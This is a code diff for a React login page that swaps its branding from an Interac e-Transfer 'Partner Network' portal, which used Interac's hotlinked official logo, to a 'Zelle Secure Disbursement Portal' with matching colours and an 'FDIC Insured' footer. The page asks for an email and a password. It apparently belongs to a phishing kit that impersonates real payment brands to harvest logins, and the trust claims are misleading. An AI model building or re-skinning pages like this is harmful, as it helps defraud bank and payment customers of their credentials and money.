@@ -23,14 +23,14 @@ import {
 } from "lucide-react"
 
 const featureItems = [
-  { icon: SendIcon,   label: "Send e-Transfer",       color: "text-blue-400",   bg: "bg-blue-500/10"   },
-  { icon: DollarSign, label: "Receive Funds",          color: "text-emerald-400", bg: "bg-emerald-500/10" },
-  { icon: CreditCard, label: "Link Bank Account",      color: "text-violet-400",  bg: "bg-violet-500/10"  },
-  { icon: History,    label: "Transaction History",    color: "text-amber-400",   bg: "bg-amber-500/10"   },
-  { icon: Users,      label: "Contacts & Recipients",  color: "text-cyan-400",    bg: "bg-cyan-500/10"    },
-  { icon: FileText,   label: "Statements & Reports",   color: "text-indigo-400",  bg: "bg-indigo-500/10"  },
-  { icon: Bell,       label: "Alerts & Notifications", color: "text-yellow-400",  bg: "bg-yellow-500/10"  },
-  { icon: BarChart3,  label: "Payment Insights",       color: "text-teal-400",    bg: "bg-teal-500/10"    },
+  { icon: SendIcon,   label: "Send Payment",           color: "text-blue-400",    bg: "bg-blue-500/10"    },
+  { icon: DollarSign, label: "Receive Funds",           color: "text-emerald-400", bg: "bg-emerald-500/10" },
+  { icon: CreditCard, label: "Link Bank Account",       color: "text-violet-400",  bg: "bg-violet-500/10"  },
+  { icon: History,    label: "Transaction History",     color: "text-amber-400",   bg: "bg-amber-500/10"   },
+  { icon: Users,      label: "Contacts & Recipients",   color: "text-cyan-400",    bg: "bg-cyan-500/10"    },
+  { icon: FileText,   label: "Statements & Reports",    color: "text-indigo-400",  bg: "bg-indigo-500/10"  },
+  { icon: Bell,       label: "Alerts & Notifications",  color: "text-purple-400",  bg: "bg-purple-500/10"  },
+  { icon: BarChart3,  label: "Payment Insights",        color: "text-teal-400",    bg: "bg-teal-500/10"    },
 ]
 
 const trustItems = [
@@ -65,7 +65,7 @@ export default function LoginPage() {
   return (
     <div className="min-h-screen bg-[#080808] flex items-stretch">
 
-      {/* ── Left panel — branding & features (desktop only) ── */}
+      {/* Left panel — branding & features (desktop only) */}
       <aside className="hidden lg:flex flex-col w-[480px] xl:w-[520px] shrink-0 border-r border-white/[0.06] bg-[#0d0d0d] relative overflow-hidden">
         {/* Subtle grid pattern */}
         <div
@@ -76,22 +76,18 @@ export default function LoginPage() {
             backgroundSize: "40px 40px",
           }}
         />
-        {/* Yellow glow top-left */}
-        <div className="absolute -top-32 -left-32 w-64 h-64 bg-[#FDB913]/8 rounded-full blur-3xl pointer-events-none" />
+        {/* Purple glow top-left */}
+        <div className="absolute -top-32 -left-32 w-64 h-64 bg-[#6D1ED4]/8 rounded-full blur-3xl pointer-events-none" />
 
         <div className="relative z-10 flex flex-col h-full px-10 xl:px-12 py-10">
           {/* Logo */}
           <div className="flex items-center gap-3.5 mb-12">
-            <div className="w-11 h-11 bg-[#FDB913] rounded-xl flex items-center justify-center p-2.5 shadow-lg shadow-[#FDB913]/20">
-              <img
-                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                alt="Interac"
-                className="w-full h-full object-contain"
-              />
+            <div className="w-11 h-11 bg-[#6D1ED4] rounded-xl flex items-center justify-center shadow-lg shadow-[#6D1ED4]/20">
+              <span className="text-white font-black text-2xl leading-none">Z</span>
             </div>
             <div>
-              <p className="text-[15px] font-bold text-white tracking-tight leading-none mb-0.5">Partner Network</p>
-              <p className="text-[11px] text-zinc-500 leading-none">Interac e&#8209;Transfer</p>
+              <p className="text-[15px] font-bold text-white tracking-tight leading-none mb-0.5">Zelle</p>
+              <p className="text-[11px] text-zinc-500 leading-none">Secure Disbursement Portal</p>
             </div>
           </div>
 
@@ -101,7 +97,7 @@ export default function LoginPage() {
               Your financial<br />gateway, secured.
             </h1>
             <p className="text-zinc-400 text-[15px] leading-relaxed max-w-xs">
-              Access all your e&#8209;Transfer services, account management, and payment tools in one place.
+              Access all your Zelle payment services, account management, and disbursement tools in one place.
             </p>
           </div>
 
@@ -129,7 +125,7 @@ export default function LoginPage() {
               const Icon = t.icon
               return (
                 <div key={i} className="flex items-center gap-1.5">
-                  <Icon className="w-3.5 h-3.5 text-[#FDB913]/70" />
+                  <Icon className="w-3.5 h-3.5 text-[#6D1ED4]/70" />
                   <span className="text-[11px] text-zinc-600">{t.label}</span>
                 </div>
               )
@@ -138,33 +134,29 @@ export default function LoginPage() {
         </div>
       </aside>
 
-      {/* ── Right panel — login form ── */}
+      {/* Right panel — login form */}
       <main className="flex-1 flex flex-col items-center justify-center px-5 sm:px-8 py-10 relative">
         {/* Subtle radial glow behind the form */}
         <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
-          <div className="w-[500px] h-[500px] bg-[#FDB913]/3 rounded-full blur-3xl" />
+          <div className="w-[500px] h-[500px] bg-[#6D1ED4]/3 rounded-full blur-3xl" />
         </div>
 
         <div className="relative z-10 w-full max-w-[400px]">
           {/* Mobile logo */}
           <div className="flex lg:hidden items-center gap-3 mb-10">
-            <div className="w-10 h-10 bg-[#FDB913] rounded-xl flex items-center justify-center p-2 shadow-lg shadow-[#FDB913]/20">
-              <img
-                src="https://etransfer-notification.interac.ca/images/new/interac_logo.png"
-                alt="Interac"
-                className="w-full h-full object-contain"
-              />
+            <div className="w-10 h-10 bg-[#6D1ED4] rounded-xl flex items-center justify-center shadow-lg shadow-[#6D1ED4]/20">
+              <span className="text-white font-black text-xl leading-none">Z</span>
             </div>
             <div>
-              <p className="text-[14px] font-bold text-white leading-none mb-0.5">Partner Network</p>
-              <p className="text-[11px] text-zinc-500 leading-none">Interac e&#8209;Transfer</p>
+              <p className="text-[14px] font-bold text-white leading-none mb-0.5">Zelle</p>
+              <p className="text-[11px] text-zinc-500 leading-none">Secure Disbursement Portal</p>
             </div>
           </div>
 
           {/* Heading */}
           <div className="mb-8">
             <h2 className="text-2xl sm:text-[28px] font-bold text-white tracking-tight mb-1.5">Welcome back</h2>
-            <p className="text-[14px] text-zinc-500">Sign in to access your portal</p>
+            <p className="text-[14px] text-zinc-500">Sign in to access your disbursement portal</p>
           </div>
 
           {/* Form card */}
@@ -185,7 +177,7 @@ export default function LoginPage() {
                   onChange={(e) => setEmail(e.target.value)}
                   required
                   disabled={isLoading}
-                  className="w-full h-11 px-3.5 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/40 focus:border-[#FDB913]/40 transition-all disabled:opacity-50"
+                  className="w-full h-11 px-3.5 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4]/40 focus:border-[#6D1ED4]/40 transition-all disabled:opacity-50"
                   style={{ fontSize: "16px" }}
                 />
               </div>
@@ -205,7 +197,7 @@ export default function LoginPage() {
                     onChange={(e) => setPassword(e.target.value)}
                     required
                     disabled={isLoading}
-                    className="w-full h-11 pl-3.5 pr-11 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/40 focus:border-[#FDB913]/40 transition-all disabled:opacity-50"
+                    className="w-full h-11 pl-3.5 pr-11 rounded-xl bg-white/[0.05] border border-white/[0.09] text-[14px] text-white placeholder:text-zinc-600 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4]/40 focus:border-[#6D1ED4]/40 transition-all disabled:opacity-50"
                     style={{ fontSize: "16px" }}
                   />
                   <button
@@ -238,7 +230,7 @@ export default function LoginPage() {
               <button
                 type="submit"
                 disabled={isLoading || !email || !password}
-                className="w-full h-11 flex items-center justify-center gap-2 rounded-xl bg-[#FDB913] text-[#111] text-[14px] font-bold tracking-wide hover:bg-[#e5a811] active:scale-[0.98] transition-all duration-150 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-[#FDB913]/10 focus:outline-none focus:ring-2 focus:ring-[#FDB913]/50 focus:ring-offset-2 focus:ring-offset-[#080808]"
+                className="w-full h-11 flex items-center justify-center gap-2 rounded-xl bg-[#6D1ED4] text-white text-[14px] font-bold tracking-wide hover:bg-[#5A18B0] active:scale-[0.98] transition-all duration-150 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-[#6D1ED4]/20 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4]/50 focus:ring-offset-2 focus:ring-offset-[#080808]"
               >
                 {isLoading ? (
                   <svg className="w-4 h-4 animate-spin" viewBox="0 0 24 24" fill="none">
@@ -276,7 +268,7 @@ export default function LoginPage() {
 
           {/* Footer */}
           <p className="text-center text-[11px] text-zinc-500 mt-8">
-            Interac e&#8209;Transfer &middot; Secure Payment Services
+            Zelle &middot; Secure Disbursement Services &middot; FDIC Insured
           </p>
         </div>
       </main>
